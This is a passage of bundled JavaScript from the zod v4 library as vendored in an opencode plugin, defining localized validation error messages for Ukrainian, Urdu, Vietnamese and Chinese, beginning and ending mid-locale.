        return `Ge\xE7ersiz ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `Ge\xE7ersiz say\u0131: ${issue3.divisor} ile tam b\xF6l\xFCnebilmeli`;
      case "unrecognized_keys":
        return `Tan\u0131nmayan anahtar${issue3.keys.length > 1 ? "lar" : ""}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `${issue3.origin} i\xE7inde ge\xE7ersiz anahtar`;
      case "invalid_union":
        return "Ge\xE7ersiz de\u011Fer";
      case "invalid_element":
        return `${issue3.origin} i\xE7inde ge\xE7ersiz de\u011Fer`;
      default:
        return `Ge\xE7ersiz de\u011Fer`;
    }
  };
};
function tr_default2() {
  return {
    localeError: error85()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/uk.js
var error86 = () => {
  const Sizable = {
    string: { unit: "\u0441\u0438\u043C\u0432\u043E\u043B\u0456\u0432", verb: "\u043C\u0430\u0442\u0438\u043C\u0435" },
    file: { unit: "\u0431\u0430\u0439\u0442\u0456\u0432", verb: "\u043C\u0430\u0442\u0438\u043C\u0435" },
    array: { unit: "\u0435\u043B\u0435\u043C\u0435\u043D\u0442\u0456\u0432", verb: "\u043C\u0430\u0442\u0438\u043C\u0435" },
    set: { unit: "\u0435\u043B\u0435\u043C\u0435\u043D\u0442\u0456\u0432", verb: "\u043C\u0430\u0442\u0438\u043C\u0435" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType8 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "\u0447\u0438\u0441\u043B\u043E";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "\u043C\u0430\u0441\u0438\u0432";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u0432\u0445\u0456\u0434\u043D\u0456 \u0434\u0430\u043D\u0456",
    email: "\u0430\u0434\u0440\u0435\u0441\u0430 \u0435\u043B\u0435\u043A\u0442\u0440\u043E\u043D\u043D\u043E\u0457 \u043F\u043E\u0448\u0442\u0438",
    url: "URL",
    emoji: "\u0435\u043C\u043E\u0434\u0437\u0456",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\u0434\u0430\u0442\u0430 \u0442\u0430 \u0447\u0430\u0441 ISO",
    date: "\u0434\u0430\u0442\u0430 ISO",
    time: "\u0447\u0430\u0441 ISO",
    duration: "\u0442\u0440\u0438\u0432\u0430\u043B\u0456\u0441\u0442\u044C ISO",
    ipv4: "\u0430\u0434\u0440\u0435\u0441\u0430 IPv4",
    ipv6: "\u0430\u0434\u0440\u0435\u0441\u0430 IPv6",
    cidrv4: "\u0434\u0456\u0430\u043F\u0430\u0437\u043E\u043D IPv4",
    cidrv6: "\u0434\u0456\u0430\u043F\u0430\u0437\u043E\u043D IPv6",
    base64: "\u0440\u044F\u0434\u043E\u043A \u0443 \u043A\u043E\u0434\u0443\u0432\u0430\u043D\u043D\u0456 base64",
    base64url: "\u0440\u044F\u0434\u043E\u043A \u0443 \u043A\u043E\u0434\u0443\u0432\u0430\u043D\u043D\u0456 base64url",
    json_string: "\u0440\u044F\u0434\u043E\u043A JSON",
    e164: "\u043D\u043E\u043C\u0435\u0440 E.164",
    jwt: "JWT",
    template_literal: "\u0432\u0445\u0456\u0434\u043D\u0456 \u0434\u0430\u043D\u0456"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0456 \u0432\u0445\u0456\u0434\u043D\u0456 \u0434\u0430\u043D\u0456: \u043E\u0447\u0456\u043A\u0443\u0454\u0442\u044C\u0441\u044F ${issue3.expected}, \u043E\u0442\u0440\u0438\u043C\u0430\u043D\u043E ${parsedType8(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0456 \u0432\u0445\u0456\u0434\u043D\u0456 \u0434\u0430\u043D\u0456: \u043E\u0447\u0456\u043A\u0443\u0454\u0442\u044C\u0441\u044F ${stringifyPrimitive2(issue3.values[0])}`;
        return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0430 \u043E\u043F\u0446\u0456\u044F: \u043E\u0447\u0456\u043A\u0443\u0454\u0442\u044C\u0441\u044F \u043E\u0434\u043D\u0435 \u0437 ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `\u0417\u0430\u043D\u0430\u0434\u0442\u043E \u0432\u0435\u043B\u0438\u043A\u0435: \u043E\u0447\u0456\u043A\u0443\u0454\u0442\u044C\u0441\u044F, \u0449\u043E ${issue3.origin ?? "\u0437\u043D\u0430\u0447\u0435\u043D\u043D\u044F"} ${sizing.verb} ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "\u0435\u043B\u0435\u043C\u0435\u043D\u0442\u0456\u0432"}`;
        return `\u0417\u0430\u043D\u0430\u0434\u0442\u043E \u0432\u0435\u043B\u0438\u043A\u0435: \u043E\u0447\u0456\u043A\u0443\u0454\u0442\u044C\u0441\u044F, \u0449\u043E ${issue3.origin ?? "\u0437\u043D\u0430\u0447\u0435\u043D\u043D\u044F"} \u0431\u0443\u0434\u0435 ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u0417\u0430\u043D\u0430\u0434\u0442\u043E \u043C\u0430\u043B\u0435: \u043E\u0447\u0456\u043A\u0443\u0454\u0442\u044C\u0441\u044F, \u0449\u043E ${issue3.origin} ${sizing.verb} ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `\u0417\u0430\u043D\u0430\u0434\u0442\u043E \u043C\u0430\u043B\u0435: \u043E\u0447\u0456\u043A\u0443\u0454\u0442\u044C\u0441\u044F, \u0449\u043E ${issue3.origin} \u0431\u0443\u0434\u0435 ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0438\u0439 \u0440\u044F\u0434\u043E\u043A: \u043F\u043E\u0432\u0438\u043D\u0435\u043D \u043F\u043E\u0447\u0438\u043D\u0430\u0442\u0438\u0441\u044F \u0437 "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0438\u0439 \u0440\u044F\u0434\u043E\u043A: \u043F\u043E\u0432\u0438\u043D\u0435\u043D \u0437\u0430\u043A\u0456\u043D\u0447\u0443\u0432\u0430\u0442\u0438\u0441\u044F \u043D\u0430 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0438\u0439 \u0440\u044F\u0434\u043E\u043A: \u043F\u043E\u0432\u0438\u043D\u0435\u043D \u043C\u0456\u0441\u0442\u0438\u0442\u0438 "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0438\u0439 \u0440\u044F\u0434\u043E\u043A: \u043F\u043E\u0432\u0438\u043D\u0435\u043D \u0432\u0456\u0434\u043F\u043E\u0432\u0456\u0434\u0430\u0442\u0438 \u0448\u0430\u0431\u043B\u043E\u043D\u0443 ${_issue.pattern}`;
        return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0438\u0439 ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0435 \u0447\u0438\u0441\u043B\u043E: \u043F\u043E\u0432\u0438\u043D\u043D\u043E \u0431\u0443\u0442\u0438 \u043A\u0440\u0430\u0442\u043D\u0438\u043C ${issue3.divisor}`;
      case "unrecognized_keys":
        return `\u041D\u0435\u0440\u043E\u0437\u043F\u0456\u0437\u043D\u0430\u043D\u0438\u0439 \u043A\u043B\u044E\u0447${issue3.keys.length > 1 ? "\u0456" : ""}: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0438\u0439 \u043A\u043B\u044E\u0447 \u0443 ${issue3.origin}`;
      case "invalid_union":
        return "\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0456 \u0432\u0445\u0456\u0434\u043D\u0456 \u0434\u0430\u043D\u0456";
      case "invalid_element":
        return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0435 \u0437\u043D\u0430\u0447\u0435\u043D\u043D\u044F \u0443 ${issue3.origin}`;
      default:
        return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0456 \u0432\u0445\u0456\u0434\u043D\u0456 \u0434\u0430\u043D\u0456`;
    }
  };
};
function uk_default2() {
  return {
    localeError: error86()
  };
}

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/ua.js
function ua_default2() {
  return uk_default2();
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/ur.js
var error87 = () => {
  const Sizable = {
    string: { unit: "\u062D\u0631\u0648\u0641", verb: "\u06C1\u0648\u0646\u0627" },
    file: { unit: "\u0628\u0627\u0626\u0679\u0633", verb: "\u06C1\u0648\u0646\u0627" },
    array: { unit: "\u0622\u0626\u0679\u0645\u0632", verb: "\u06C1\u0648\u0646\u0627" },
    set: { unit: "\u0622\u0626\u0679\u0645\u0632", verb: "\u06C1\u0648\u0646\u0627" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType8 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "\u0646\u0645\u0628\u0631";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "\u0622\u0631\u06D2";
        }
        if (data === null) {
          return "\u0646\u0644";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u0627\u0646 \u067E\u0679",
    email: "\u0627\u06CC \u0645\u06CC\u0644 \u0627\u06CC\u0688\u0631\u06CC\u0633",
    url: "\u06CC\u0648 \u0622\u0631 \u0627\u06CC\u0644",
    emoji: "\u0627\u06CC\u0645\u0648\u062C\u06CC",
    uuid: "\u06CC\u0648 \u06CC\u0648 \u0622\u0626\u06CC \u0688\u06CC",
    uuidv4: "\u06CC\u0648 \u06CC\u0648 \u0622\u0626\u06CC \u0688\u06CC \u0648\u06CC 4",
    uuidv6: "\u06CC\u0648 \u06CC\u0648 \u0622\u0626\u06CC \u0688\u06CC \u0648\u06CC 6",
    nanoid: "\u0646\u06CC\u0646\u0648 \u0622\u0626\u06CC \u0688\u06CC",
    guid: "\u062C\u06CC \u06CC\u0648 \u0622\u0626\u06CC \u0688\u06CC",
    cuid: "\u0633\u06CC \u06CC\u0648 \u0622\u0626\u06CC \u0688\u06CC",
    cuid2: "\u0633\u06CC \u06CC\u0648 \u0622\u0626\u06CC \u0688\u06CC 2",
    ulid: "\u06CC\u0648 \u0627\u06CC\u0644 \u0622\u0626\u06CC \u0688\u06CC",
    xid: "\u0627\u06CC\u06A9\u0633 \u0622\u0626\u06CC \u0688\u06CC",
    ksuid: "\u06A9\u06D2 \u0627\u06CC\u0633 \u06CC\u0648 \u0622\u0626\u06CC \u0688\u06CC",
    datetime: "\u0622\u0626\u06CC \u0627\u06CC\u0633 \u0627\u0648 \u0688\u06CC\u0679 \u0679\u0627\u0626\u0645",
    date: "\u0622\u0626\u06CC \u0627\u06CC\u0633 \u0627\u0648 \u062A\u0627\u0631\u06CC\u062E",
    time: "\u0622\u0626\u06CC \u0627\u06CC\u0633 \u0627\u0648 \u0648\u0642\u062A",
    duration: "\u0622\u0626\u06CC \u0627\u06CC\u0633 \u0627\u0648 \u0645\u062F\u062A",
    ipv4: "\u0622\u0626\u06CC \u067E\u06CC \u0648\u06CC 4 \u0627\u06CC\u0688\u0631\u06CC\u0633",
    ipv6: "\u0622\u0626\u06CC \u067E\u06CC \u0648\u06CC 6 \u0627\u06CC\u0688\u0631\u06CC\u0633",
    cidrv4: "\u0622\u0626\u06CC \u067E\u06CC \u0648\u06CC 4 \u0631\u06CC\u0646\u062C",
    cidrv6: "\u0622\u0626\u06CC \u067E\u06CC \u0648\u06CC 6 \u0631\u06CC\u0646\u062C",
    base64: "\u0628\u06CC\u0633 64 \u0627\u0646 \u06A9\u0648\u0688\u0688 \u0633\u0679\u0631\u0646\u06AF",
    base64url: "\u0628\u06CC\u0633 64 \u06CC\u0648 \u0622\u0631 \u0627\u06CC\u0644 \u0627\u0646 \u06A9\u0648\u0688\u0688 \u0633\u0679\u0631\u0646\u06AF",
    json_string: "\u062C\u06D2 \u0627\u06CC\u0633 \u0627\u0648 \u0627\u06CC\u0646 \u0633\u0679\u0631\u0646\u06AF",
    e164: "\u0627\u06CC 164 \u0646\u0645\u0628\u0631",
    jwt: "\u062C\u06D2 \u0688\u0628\u0644\u06CC\u0648 \u0679\u06CC",
    template_literal: "\u0627\u0646 \u067E\u0679"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u063A\u0644\u0637 \u0627\u0646 \u067E\u0679: ${issue3.expected} \u0645\u062A\u0648\u0642\u0639 \u062A\u06BE\u0627\u060C ${parsedType8(issue3.input)} \u0645\u0648\u0635\u0648\u0644 \u06C1\u0648\u0627`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\u063A\u0644\u0637 \u0627\u0646 \u067E\u0679: ${stringifyPrimitive2(issue3.values[0])} \u0645\u062A\u0648\u0642\u0639 \u062A\u06BE\u0627`;
        return `\u063A\u0644\u0637 \u0622\u067E\u0634\u0646: ${joinValues2(issue3.values, "|")} \u0645\u06CC\u06BA \u0633\u06D2 \u0627\u06CC\u06A9 \u0645\u062A\u0648\u0642\u0639 \u062A\u06BE\u0627`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `\u0628\u06C1\u062A \u0628\u0691\u0627: ${issue3.origin ?? "\u0648\u06CC\u0644\u06CC\u0648"} \u06A9\u06D2 ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "\u0639\u0646\u0627\u0635\u0631"} \u06C1\u0648\u0646\u06D2 \u0645\u062A\u0648\u0642\u0639 \u062A\u06BE\u06D2`;
        return `\u0628\u06C1\u062A \u0628\u0691\u0627: ${issue3.origin ?? "\u0648\u06CC\u0644\u06CC\u0648"} \u06A9\u0627 ${adj}${issue3.maximum.toString()} \u06C1\u0648\u0646\u0627 \u0645\u062A\u0648\u0642\u0639 \u062A\u06BE\u0627`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u0628\u06C1\u062A \u0686\u06BE\u0648\u0679\u0627: ${issue3.origin} \u06A9\u06D2 ${adj}${issue3.minimum.toString()} ${sizing.unit} \u06C1\u0648\u0646\u06D2 \u0645\u062A\u0648\u0642\u0639 \u062A\u06BE\u06D2`;
        }
        return `\u0628\u06C1\u062A \u0686\u06BE\u0648\u0679\u0627: ${issue3.origin} \u06A9\u0627 ${adj}${issue3.minimum.toString()} \u06C1\u0648\u0646\u0627 \u0645\u062A\u0648\u0642\u0639 \u062A\u06BE\u0627`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with") {
          return `\u063A\u0644\u0637 \u0633\u0679\u0631\u0646\u06AF: "${_issue.prefix}" \u0633\u06D2 \u0634\u0631\u0648\u0639 \u06C1\u0648\u0646\u0627 \u0686\u0627\u06C1\u06CC\u06D2`;
        }
        if (_issue.format === "ends_with")
          return `\u063A\u0644\u0637 \u0633\u0679\u0631\u0646\u06AF: "${_issue.suffix}" \u067E\u0631 \u062E\u062A\u0645 \u06C1\u0648\u0646\u0627 \u0686\u0627\u06C1\u06CC\u06D2`;
        if (_issue.format === "includes")
          return `\u063A\u0644\u0637 \u0633\u0679\u0631\u0646\u06AF: "${_issue.includes}" \u0634\u0627\u0645\u0644 \u06C1\u0648\u0646\u0627 \u0686\u0627\u06C1\u06CC\u06D2`;
        if (_issue.format === "regex")
          return `\u063A\u0644\u0637 \u0633\u0679\u0631\u0646\u06AF: \u067E\u06CC\u0679\u0631\u0646 ${_issue.pattern} \u0633\u06D2 \u0645\u06CC\u0686 \u06C1\u0648\u0646\u0627 \u0686\u0627\u06C1\u06CC\u06D2`;
        return `\u063A\u0644\u0637 ${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `\u063A\u0644\u0637 \u0646\u0645\u0628\u0631: ${issue3.divisor} \u06A9\u0627 \u0645\u0636\u0627\u0639\u0641 \u06C1\u0648\u0646\u0627 \u0686\u0627\u06C1\u06CC\u06D2`;
      case "unrecognized_keys":
        return `\u063A\u06CC\u0631 \u062A\u0633\u0644\u06CC\u0645 \u0634\u062F\u06C1 \u06A9\u06CC${issue3.keys.length > 1 ? "\u0632" : ""}: ${joinValues2(issue3.keys, "\u060C ")}`;
      case "invalid_key":
        return `${issue3.origin} \u0645\u06CC\u06BA \u063A\u0644\u0637 \u06A9\u06CC`;
      case "invalid_union":
        return "\u063A\u0644\u0637 \u0627\u0646 \u067E\u0679";
      case "invalid_element":
        return `${issue3.origin} \u0645\u06CC\u06BA \u063A\u0644\u0637 \u0648\u06CC\u0644\u06CC\u0648`;
      default:
        return `\u063A\u0644\u0637 \u0627\u0646 \u067E\u0679`;
    }
  };
};
function ur_default2() {
  return {
    localeError: error87()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/vi.js
var error88 = () => {
  const Sizable = {
    string: { unit: "k\xFD t\u1EF1", verb: "c\xF3" },
    file: { unit: "byte", verb: "c\xF3" },
    array: { unit: "ph\u1EA7n t\u1EED", verb: "c\xF3" },
    set: { unit: "ph\u1EA7n t\u1EED", verb: "c\xF3" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType8 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "s\u1ED1";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "m\u1EA3ng";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u0111\u1EA7u v\xE0o",
    email: "\u0111\u1ECBa ch\u1EC9 email",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ng\xE0y gi\u1EDD ISO",
    date: "ng\xE0y ISO",
    time: "gi\u1EDD ISO",
    duration: "kho\u1EA3ng th\u1EDDi gian ISO",
    ipv4: "\u0111\u1ECBa ch\u1EC9 IPv4",
    ipv6: "\u0111\u1ECBa ch\u1EC9 IPv6",
    cidrv4: "d\u1EA3i IPv4",
    cidrv6: "d\u1EA3i IPv6",
    base64: "chu\u1ED7i m\xE3 h\xF3a base64",
    base64url: "chu\u1ED7i m\xE3 h\xF3a base64url",
    json_string: "chu\u1ED7i JSON",
    e164: "s\u1ED1 E.164",
    jwt: "JWT",
    template_literal: "\u0111\u1EA7u v\xE0o"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u0110\u1EA7u v\xE0o kh\xF4ng h\u1EE3p l\u1EC7: mong \u0111\u1EE3i ${issue3.expected}, nh\u1EADn \u0111\u01B0\u1EE3c ${parsedType8(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\u0110\u1EA7u v\xE0o kh\xF4ng h\u1EE3p l\u1EC7: mong \u0111\u1EE3i ${stringifyPrimitive2(issue3.values[0])}`;
        return `T\xF9y ch\u1ECDn kh\xF4ng h\u1EE3p l\u1EC7: mong \u0111\u1EE3i m\u1ED9t trong c\xE1c gi\xE1 tr\u1ECB ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `Qu\xE1 l\u1EDBn: mong \u0111\u1EE3i ${issue3.origin ?? "gi\xE1 tr\u1ECB"} ${sizing.verb} ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "ph\u1EA7n t\u1EED"}`;
        return `Qu\xE1 l\u1EDBn: mong \u0111\u1EE3i ${issue3.origin ?? "gi\xE1 tr\u1ECB"} ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `Qu\xE1 nh\u1ECF: mong \u0111\u1EE3i ${issue3.origin} ${sizing.verb} ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `Qu\xE1 nh\u1ECF: mong \u0111\u1EE3i ${issue3.origin} ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `Chu\u1ED7i kh\xF4ng h\u1EE3p l\u1EC7: ph\u1EA3i b\u1EAFt \u0111\u1EA7u b\u1EB1ng "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `Chu\u1ED7i kh\xF4ng h\u1EE3p l\u1EC7: ph\u1EA3i k\u1EBFt th\xFAc b\u1EB1ng "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `Chu\u1ED7i kh\xF4ng h\u1EE3p l\u1EC7: ph\u1EA3i bao g\u1ED3m "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `Chu\u1ED7i kh\xF4ng h\u1EE3p l\u1EC7: ph\u1EA3i kh\u1EDBp v\u1EDBi m\u1EABu ${_issue.pattern}`;
        return `${Nouns[_issue.format] ?? issue3.format} kh\xF4ng h\u1EE3p l\u1EC7`;
      }
      case "not_multiple_of":
        return `S\u1ED1 kh\xF4ng h\u1EE3p l\u1EC7: ph\u1EA3i l\xE0 b\u1ED9i s\u1ED1 c\u1EE7a ${issue3.divisor}`;
      case "unrecognized_keys":
        return `Kh\xF3a kh\xF4ng \u0111\u01B0\u1EE3c nh\u1EADn d\u1EA1ng: ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `Kh\xF3a kh\xF4ng h\u1EE3p l\u1EC7 trong ${issue3.origin}`;
      case "invalid_union":
        return "\u0110\u1EA7u v\xE0o kh\xF4ng h\u1EE3p l\u1EC7";
      case "invalid_element":
        return `Gi\xE1 tr\u1ECB kh\xF4ng h\u1EE3p l\u1EC7 trong ${issue3.origin}`;
      default:
        return `\u0110\u1EA7u v\xE0o kh\xF4ng h\u1EE3p l\u1EC7`;
    }
  };
};
function vi_default2() {
  return {
    localeError: error88()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/zh-CN.js
var error89 = () => {
  const Sizable = {
    string: { unit: "\u5B57\u7B26", verb: "\u5305\u542B" },
    file: { unit: "\u5B57\u8282", verb: "\u5305\u542B" },
    array: { unit: "\u9879", verb: "\u5305\u542B" },
    set: { unit: "\u9879", verb: "\u5305\u542B" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType8 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "\u975E\u6570\u5B57(NaN)" : "\u6570\u5B57";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "\u6570\u7EC4";
        }
        if (data === null) {
          return "\u7A7A\u503C(null)";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u8F93\u5165",
    email: "\u7535\u5B50\u90AE\u4EF6",
    url: "URL",
    emoji: "\u8868\u60C5\u7B26\u53F7",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO\u65E5\u671F\u65F6\u95F4",
    date: "ISO\u65E5\u671F",
    time: "ISO\u65F6\u95F4",
    duration: "ISO\u65F6\u957F",
    ipv4: "IPv4\u5730\u5740",
    ipv6: "IPv6\u5730\u5740",
    cidrv4: "IPv4\u7F51\u6BB5",
    cidrv6: "IPv6\u7F51\u6BB5",
    base64: "base64\u7F16\u7801\u5B57\u7B26\u4E32",
    base64url: "base64url\u7F16\u7801\u5B57\u7B26\u4E32",
    json_string: "JSON\u5B57\u7B26\u4E32",
    e164: "E.164\u53F7\u7801",
    jwt: "JWT",
    template_literal: "\u8F93\u5165"
  };
  return (issue3) => {
    switch (issue3.code) {
      case "invalid_type":
        return `\u65E0\u6548\u8F93\u5165\uFF1A\u671F\u671B ${issue3.expected}\uFF0C\u5B9E\u9645\u63A5\u6536 ${parsedType8(issue3.input)}`;
      case "invalid_value":
        if (issue3.values.length === 1)
          return `\u65E0\u6548\u8F93\u5165\uFF1A\u671F\u671B ${stringifyPrimitive2(issue3.values[0])}`;
        return `\u65E0\u6548\u9009\u9879\uFF1A\u671F\u671B\u4EE5\u4E0B\u4E4B\u4E00 ${joinValues2(issue3.values, "|")}`;
      case "too_big": {
        const adj = issue3.inclusive ? "<=" : "<";
        const sizing = getSizing(issue3.origin);
        if (sizing)
          return `\u6570\u503C\u8FC7\u5927\uFF1A\u671F\u671B ${issue3.origin ?? "\u503C"} ${adj}${issue3.maximum.toString()} ${sizing.unit ?? "\u4E2A\u5143\u7D20"}`;
        return `\u6570\u503C\u8FC7\u5927\uFF1A\u671F\u671B ${issue3.origin ?? "\u503C"} ${adj}${issue3.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue3.inclusive ? ">=" : ">";
        const sizing = getSizing(issue3.origin);
        if (sizing) {
          return `\u6570\u503C\u8FC7\u5C0F\uFF1A\u671F\u671B ${issue3.origin} ${adj}${issue3.minimum.toString()} ${sizing.unit}`;
        }
        return `\u6570\u503C\u8FC7\u5C0F\uFF1A\u671F\u671B ${issue3.origin} ${adj}${issue3.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue3;
        if (_issue.format === "starts_with")
          return `\u65E0\u6548\u5B57\u7B26\u4E32\uFF1A\u5FC5\u987B\u4EE5 "${_issue.prefix}" \u5F00\u5934`;
        if (_issue.format === "ends_with")
          return `\u65E0\u6548\u5B57\u7B26\u4E32\uFF1A\u5FC5\u987B\u4EE5 "${_issue.suffix}" \u7ED3\u5C3E`;
        if (_issue.format === "includes")
          return `\u65E0\u6548\u5B57\u7B26\u4E32\uFF1A\u5FC5\u987B\u5305\u542B "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u65E0\u6548\u5B57\u7B26\u4E32\uFF1A\u5FC5\u987B\u6EE1\u8DB3\u6B63\u5219\u8868\u8FBE\u5F0F ${_issue.pattern}`;
        return `\u65E0\u6548${Nouns[_issue.format] ?? issue3.format}`;
      }
      case "not_multiple_of":
        return `\u65E0\u6548\u6570\u5B57\uFF1A\u5FC5\u987B\u662F ${issue3.divisor} \u7684\u500D\u6570`;
      case "unrecognized_keys":
        return `\u51FA\u73B0\u672A\u77E5\u7684\u952E(key): ${joinValues2(issue3.keys, ", ")}`;
      case "invalid_key":
        return `${issue3.origin} \u4E2D\u7684\u952E(key)\u65E0\u6548`;
      case "invalid_union":
        return "\u65E0\u6548\u8F93\u5165";
      case "invalid_element":
        return `${issue3.origin} \u4E2D\u5305\u542B\u65E0\u6548\u503C(value)`;
      default:
        return `\u65E0\u6548\u8F93\u5165`;
    }
  };
};
function zh_CN_default2() {
  return {
    localeError: error89()
  };
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/locales/zh-TW.js
var error90 = () => {
  const Sizable = {
    string: { unit: "\u5B57\u5143", verb: "\u64C1\u6709" },
    file: { unit: "\u4F4D\u5143\u7D44", verb: "\u64C1\u6709" },
    array: { unit: "\u9805\u76EE", verb: "\u64C1\u6709" },
    set: { unit: "\u9805\u76EE", verb: "\u64C1\u6709" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const parsedType8 = (data) => {
    const t = typeof data;
    switch (t) {
      case "number": {
        return Number.isNaN(data) ? "NaN" : "number";
      }
      case "object": {
        if (Array.isArray(data)) {
          return "array";
        }
        if (data === null) {
          return "null";
        }
        if (Object.getPrototypeOf(data) !== Object.prototype && data.constructor) {
          return data.constructor.name;
        }
      }
    }
    return t;
  };
  const Nouns = {
    regex: "\u8F38\u5165",
    email: "\u90F5\u4EF6\u5730\u5740",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
